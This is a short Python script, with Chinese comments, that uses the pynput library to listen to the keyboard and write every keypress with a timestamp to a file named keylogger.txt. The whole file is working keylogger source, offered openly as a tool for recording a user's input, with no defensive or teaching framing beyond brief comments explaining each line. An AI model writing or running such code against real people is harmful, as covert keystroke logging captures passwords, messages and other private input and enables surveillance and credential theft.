#键盘监听并记录用户输入信息
#pynput
import logging
from pynput.keyboard import Listener

#对logging进行配置 配置debug
logging.basicConfig(filename=('keylogger.txt'),format='%(asctime)s:%(message)s',level=logging.DEBUG)#1 为日志文件存储的位置  2  对存储的内容进行格式化  3 日志的等级-debug
#定义一个方法 用于按键记录键值
def press(key):
	logging.info(key)

	
	
with Listener(on_press = press) as listener:
	listener.join()